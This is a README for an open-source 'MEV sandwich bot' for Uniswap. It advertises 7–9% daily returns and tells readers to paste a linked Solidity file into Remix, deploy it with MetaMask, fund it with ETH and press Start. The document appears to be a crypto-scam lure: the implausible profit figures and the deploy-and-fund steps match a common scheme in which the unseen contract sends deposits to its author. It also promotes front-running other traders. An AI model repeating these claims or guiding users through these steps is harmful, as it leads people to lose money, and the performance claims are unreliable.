
# 🥪 Ethereum Uniswap MEV. Sandwich Bot (DeFi)
![Bot Controls](https://imgur.com/Z5aVSek.png)

<div align="center">
<i>An open-source arbitrage bot designed to capitalize on market inefficiencies in Uniswap liquidity pools.<br>Built for DeFi enthusiasts who want to explore Ethereum MEV (Maximal Extractable Value) trading strategies.</i>
</div>

<div align="center">
  <a href="https://github.com/Calindra54z05L/Mev-Bot-Uniswap">
    <img src="https://img.shields.io/github/stars/Calindra54z05L/Mev-Bot-Uniswap?style=social" alt="GitHub stars" />
  </a>
  <a href="https://github.com/Calindra54z05L/Mev-Bot-Uniswap">
    <img src="https://img.shields.io/github/forks/Calindra54z05L/Mev-Bot-Uniswap?style=social" alt="GitHub forks" />
  </a>
  <a href="https://github.com/ntkme/github-buttons/workflows/build">
    <img src="https://github.com/ntkme/github-buttons/workflows/build/badge.svg" alt="build" />
  </a>
</div>

<div align="center">
  <img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white" alt="Ethereum" />
  <img src="https://img.shields.io/badge/Solidity-%23363636.svg?style=for-the-badge&logo=solidity&logoColor=white" alt="Solidity" />
</div>

## 📊 Current Performance

- **Avg. Daily Return**: 7–9% on deployed capital (varies with market volatility).
- **Minimum Capital Requirement**: 0.5 ETH (under current gas and liquidity conditions).
- **Note**: Profitability depends on network congestion, competition, and pool liquidity.
- **Disclaimer**: No guarantees. Past performance does not predict future results.

---

## 📈 Latest Profitable Transactions

**Last Updated**: 2025-04-19

Below are the latest profitable transactions executed by our live [MEV Sandwich Bot](https://etherscan.io/address/0x0000e0ca771e21bd00057f54a68c30d400000000), showcasing real-time profits in ETH.

| Tx Hash                                                                 | Block    | Profit (ETH) | Timestamp           |
|-------------------------------------------------------------------------|----------|--------------|---------------------|
| [0xe37e36c0...](https://etherscan.io/tx/0xe37e36c09288d1da494fdac72feef7d98151c1ef9e4bd84f149479c9e7a22019) | 22305941 | 0.003892     | 2025-04-19 22:09:35 |
| [0x141baa2f...](https://etherscan.io/tx/0x141baa2f03c80f57e884ed1a179f5c6e62778d1ca43d6eb2ec4ea5dd3fc265f5) | 22305935 | 0.002715     | 2025-04-19 22:08:23 |
| [0x57e4517a...](https://etherscan.io/tx/0x57e4517a936e04ed30f896039c0b9959891578ea1eba5c070fa04568e2d49b91) | 22305918 | 0.004231     | 2025-04-19 22:04:59 |
| [0x6c200d17...](https://etherscan.io/tx/0x6c200d17ec00ac0348a3f26c1a96361f81053effde6d92e67cd88598fc25d4e8) | 22305823 | 0.001119     | 2025-04-19 21:45:59 |
| [0x71ab9f2a...](https://etherscan.io/tx/0x71ab9f2a9287ca8a048a1857733bb4275dc37e116c411433cd4829e73d3b2b71) | 22305820 | 0.003198     | 2025-04-19 21:45:23 |

---

## 📚 How This Bot Works

This bot monitors pending transactions in the Ethereum mempool for large swaps on Uniswap. When it detects a **high-slippage transaction**, it executes a **three-step strategy**:

1. Buys the target asset before the large swap.
2. Waits for the target swap to shift the asset’s price.
3. Sells the asset at the optimized price.

The bot can perform multiple transactions if necessary to capture an opportunity.

---

## ✨ Features

- Automatically monitors the Ethereum mempool and executes MEV strategies.
- Dynamic gas pricing to remain competitive.
- Built-in reverts for failed transactions and profit thresholds to filter unprofitable trades.
- Open-source and modular codebase for tweaking strategies (e.g., profit thresholds, gas multipliers, etc.).

---

## ⚡ How to Run the Bot

### 1. Install a Wallet
Download and set up [MetaMask](https://metamask.io/download.html) or any other EVM-compatible wallet.

### 2. Open Remix
Access [Remix - Ethereum IDE](https://remix.ethereum.org), a web-based environment for writing, compiling, and deploying Ethereum smart contracts.

### 3. Create a New File
📁 Create a new file in Remix and name it, e.g., `bot.sol`.

![Create New File](https://i.imgur.com/1XiPUes.png)

### 4. Paste the Code
📋 Copy the [bot code](bots.sol) from GitHub and paste it into your newly created Remix file.

### 5. Compile the Contract
🔧 Go to the `Solidity Compiler` tab, select version `0.6.6+commit`, and click `Compile bot.sol`.

![Compile Contract](https://i.imgur.com/s5OAv6g.png)

### 6. Deploy the Bot
🚀 Navigate to the `Deploy & Run Transactions` tab, select the `Injected Provider - MetaMask` environment, and click `Deploy`. Approve the MetaMask contract creation fee to deploy your MEV bot.

![Deploy Contract](https://i.imgur.com/2odZQNj.png)

---

## ⚙️ Configuration

### 7. Fund Your Bot
Copy your newly deployed contract address and fund it with at least 0.2 ETH as the initial balance by sending ETH to the contract address.

![Fund Bot](https://i.imgur.com/80NJYYr.png)

### 8. Control the Bot
Use the following buttons to manage your bot:

- **Start**: Click the `Start` button to activate the bot after funding.
- **Stop**: Click the `Stop` button to halt bot operations.
- **Withdrawal**: Click the `Withdrawal` button to withdraw all ETH to the owner (the wallet address that deployed the bot).

![Bot Controls](https://i.imgur.com/ktiJ1Ll.png)

![Bot Interface](https://i.imgur.com/xczMc3G.png)

---

## 📜 License

This project is [MIT licensed](LICENSE).

**Reminder**: Open-source does not equal endorsement. Use responsibly.

---

## ⭐ Show Your Support

If you find this project helpful, please consider giving it a star on GitHub. Your support motivates further development and improvements.

---

## 💭 FAQ

### Do I need to keep Remix open in the browser while the bot is running?

No, you can close Remix after deploying the bot. Save the bot's contract address. To access it later, recompile the code in Remix as in step 5, go to `Deploy & Run Transactions`, reconnect MetaMask, paste your contract address into `Load contract from Address`, and click `At Address`. The bot will appear under "Deployed Contracts".

### Does it work on other chains or DEXes?

Currently, the bot is designed exclusively for Ethereum and Uniswap pools.

---

## 🤝 Contribute & Customize

**Want to improve the bot?**

1. Fork the repository.
2. Add your enhancements (e.g., new pool filters, gas optimizations).
3. Submit a pull request!
